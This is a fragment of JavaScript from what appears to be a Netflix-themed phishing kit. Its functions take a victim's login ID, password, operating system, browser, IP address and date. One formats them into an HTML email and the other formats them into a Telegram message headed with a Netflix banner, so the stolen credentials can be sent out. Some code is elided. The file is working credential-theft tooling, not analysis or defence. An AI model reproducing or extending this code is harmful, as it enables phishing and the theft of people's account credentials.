...
function createEmailContent(iduserLoginId, idpassword, OS, browser, ip, date) {
    return `
<html>
<head>
    <style type="text/css">
...
async function sendToTelegram(iduserLoginId, idpassword, OS, browser, ip, date) {
    const message = `
[+]━━━━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 Login INFO】━━━━━━━━━━━━━━[+]
[👤 Login] = ${iduserLoginId}
...
//# sourceMappingURL=send_login.js.map